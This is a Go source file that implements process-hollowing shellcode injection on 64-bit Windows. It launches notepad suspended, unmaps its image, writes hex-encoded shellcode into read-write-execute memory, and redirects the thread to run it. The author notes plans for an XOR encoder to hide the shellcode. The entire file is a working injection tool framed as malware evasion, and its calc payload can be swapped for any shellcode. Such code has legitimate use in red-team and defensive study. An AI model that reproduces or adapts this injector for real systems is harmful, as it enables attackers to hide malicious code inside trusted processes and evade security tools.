/*
	@saulpanders
	Process hollowing shellcode injection technique

	currently pops shellcode for calc


	METHOD:

			1. Start new process in suspended state by calling CreateProcess w/ CREATE_SUSPENDED (0x4)
			2. Unmap memory allocated for proc w/ NtUnmapViewOfSection
			3. Allocate space in memory for payload using VirtualAllocEx
			4. Inject payload into memory at allocated region w/ WriteProcessMemory
			5. Change execution point of target process to start on payload w/ GetThreadContext
			6. Resume target process execution by calling ResumeThread


	TODO:

		XOR encoder for shellcode
		Refactor code to "functions"

	BUILD:

		go build processhollowing.go -o goProcessHollowing.exe

		I like to use notepad to test

		///THIS WORKS FOR 64 BIT!!!!


	inspired by https://www.deepinstinct.com/2019/09/15/malware-evasion-techniques-part-1-process-injection-and-manipulation/
	some help with thread contexts from https://github.com/abdullah2993/go-runpe/blob/master/runpe.go
	^ gave me the idea to use offsets instead of defining cumbersome structs ;)

	since we are using a PIC shellcode for PoC code, we dont have to deal with mapping a real PE into memory (parsing PEB etc)

*/

package main

import (
	"encoding/binary"
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	//"os"
	"syscall"
	"unsafe"
	// Sub Repositories
	"golang.org/x/sys/windows"
)

const (
	CREATE_SUSPENDED = 0x00000004

	PROCESS_CREATE_THREAD     = 0x0080
	PROCESS_QUERY_INFORMATION = 0x0400
	PROCESS_VM_OPERATION      = 0x0008
	PROCESS_VM_READ           = 0x0010
	PROCESS_VM_WRITE          = 0x0020

	CREATE_THREAD_ACCESS = (PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ)

	MEM_COMMIT  = 0x00001000
	MEM_RESERVE = 0x00002000

	MEM_PERMISSIONS = (MEM_COMMIT | MEM_RESERVE)

	PAGE_READWRITE          = 0x04
	PAGE_EXECUTE_READ       = 0x20
	PAGE_READ_WRITE_EXECUTE = 0x40

	CREATE_NO_WINDOW = 0x08000000

	THREAD_SET_CONTEXT = 0x0010

	CONTEXT_i386    = 0x10000
	CONTEXT_INTEGER = (CONTEXT_i386 | 0x02)
)

type FLOATING_SAVE_AREA struct {
	ControlWord   uint32
	StatusWord    uint32
	TagWord       uint32
	ErrorOffset   uint32
	ErrorSelector uint32
	DataOffset    uint32
	DataSelector  uint32
	RegisterArea  [80]byte
	Cr0NpxState   uint32
}

/*
use this for 32bit version?
type CONTEXT struct {
	//retrieved by CONTEXT_DEBUG_REGISTER
	ContextFlags uint32
	Dr0          uint32
	Dr1          uint32
	Dr2          uint32
	Dr3          uint32
	Dr6          uint32
	Dr7          uint32
	//retrieved by CONTEXT_FLOATING_POINT
	FloatSave FLOATING_SAVE_AREA
	//retrieved by CONTEXT_SEGMENTS
	segGs uint32
	segFs uint32
	segEs uint32
	segDs uint32
	//retrieved by CONTEXT_INTEGER
	Edi uint32
	Esi uint32
	Ebx uint32
	Edx uint32
	Ecx uint32
	Eax uint32
	//retrieved by CONTEXT_CONTROL
	Ebp    uint32
	Eip    uint32
	SegCs  uint32
	EFlags uint32
	Esp    uint32
	SegSs  uint32
	//retrieved by CONTEXT_EXTENDED REGISTERS
	ExtendedRegisters [512]byte
}
*/

type CONTEXT struct {
	P1Home uint64
	P2Home uint64
	P3Home uint64
	P4Home uint64
	P5Home uint64
	P6Home uint64
	//retrieved by CONTEXT_DEBUG_REGISTER
	ContextFlags uint32
	MxCsr        uint32
	SegCs        uint16
	segDs        uint16
	SegEs        uint16
	segFs        uint16
	SegGs        uint16
	SegSs        uint16

	Dr0 uint64
	Dr1 uint64
	Dr2 uint64
	Dr3 uint64
	Dr6 uint64
	Dr7 uint64

	//retrieved by CONTEXT_INTEGER
	Rax uint64
	Rcx uint64
	Rdx uint64
	Rbx uint64
	Rsp uint64
	Rsi uint64
	Rdi uint64
	Rbp uint64
	R8  uint64
	R9  uint64
	R10 uint64
	R11 uint64
	R12 uint64
	R13 uint64
	R14 uint64
	R15 uint64
	Rip uint64
}

func main() {

	//ARGS

	verbose := flag.Bool("verbose", false, "Enable verbose output")
	flag.Parse()

	//Pop Calc Shellcode - SOLID SHELLCODE POC
	shellcode, errShellcode := hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")
	if errShellcode != nil {
		log.Fatal(fmt.Sprintf("[!]there was an error decoding the string to a hex byte array: %s", errShellcode.Error()))
	}

	//import libraries
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")

	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	GetThreadContext := kernel32.NewProc("GetThreadContext")
	SetThreadContext := kernel32.NewProc("SetThreadContext")
	//ResumeThread := kernel32.NewProc("ResumeThread")

	NtUnmapViewOfSection := ntdll.NewProc("NtUnmapViewOfSection")

	var si windows.StartupInfo
	var pi windows.ProcessInformation
	var psec windows.SecurityAttributes
	var tsec windows.SecurityAttributes

	//create suspended process - CreateProcess
	argv := syscall.StringToUTF16Ptr("C:\\WINDOWS\\system32\\notepad.exe")
	errCreateProcess := windows.CreateProcess(argv, nil, &psec, &tsec, false, CREATE_SUSPENDED, nil, nil, &si, &pi)

	if errCreateProcess != nil {
		log.Fatal(fmt.Sprintf("[!]Error calling CreateProcess:\r\n%s", errCreateProcess.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully created a process with PID: %d", pi.ProcessId))
	}

	//unmapping memory - NtUnmapViewOfSection
	_, _, errNtUnmapViewOfSection := NtUnmapViewOfSection.Call(uintptr(pi.Process))

	if errNtUnmapViewOfSection != nil && errNtUnmapViewOfSection.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling NtUnmapViewOfSection:\r\n%s", errNtUnmapViewOfSection.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully unmapped memory in %d", pi.ProcessId))

	}

	//Allocating memory in process - VirtualAllocEx
	addr, _, errVirtualAllocEx := VirtualAllocEx.Call(uintptr(pi.Process), 0, uintptr(len(shellcode)), MEM_PERMISSIONS, PAGE_READ_WRITE_EXECUTE)

	if errVirtualAllocEx != nil && errVirtualAllocEx.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAllocEx:\r\n%s", errVirtualAllocEx.Error()))
	}

	if addr == 0 {
		log.Fatal("[!]VirtualAllocEx failed and returned 0")
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully allocated memory in PID %d", pi.ProcessId))
	}

	//Writing shellcode into allocated memory - WriteProcessMemory
	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(pi.Process), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	if errWriteProcessMemory != nil && errWriteProcessMemory.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling WriteProcessMemory:\r\n%s", errWriteProcessMemory.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully wrote shellcode to PID %d", pi.ProcessId))

	}

	//define data buffer that holds size of 64bit thread context struct
	ctx := make([]uint8, 1232)

	// ctx[12] = 0x00100000 | 0x00000002 //CONTEXT_INTEGER flag to Rdx
	binary.LittleEndian.PutUint32(ctx[48:], CONTEXT_INTEGER)
	//other offsets can be found  at https://stackoverflow.com/questions/37656523/declaring-context-struct-for-pinvoke-windows-x64
	ctxPtr := unsafe.Pointer(&ctx[0])

	//getting current thread context (to resume) GetThreadContext
	_, _, errGetThreadContext := GetThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(ctxPtr)))

	if errGetThreadContext != nil && errGetThreadContext.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling GetThreadContext:\r\n%s", errGetThreadContext.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully got thread context  %d in %d", pi.Thread, pi.ProcessId))

	}

	//fix rcx to point to shellcode (addr)
	binary.LittleEndian.PutUint64(ctx[128:], uint64(addr))

	_, _, errSetThreadContext := SetThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(ctxPtr)))
	if errSetThreadContext != nil && errSetThreadContext.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling SetThreadContext:\r\n%s", errSetThreadContext.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully set thread for %d in  %d", pi.Thread, pi.ProcessId))

	}

	//resuming thread
	_, errResumeThread := windows.ResumeThread(pi.Thread)
	if errResumeThread != nil {
		log.Fatal(fmt.Sprintf("[!]Error calling ResumeThread:\r\n%s", errResumeThread.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully resumed thread %d in %d", pi.Thread, pi.ProcessId))
	}

}
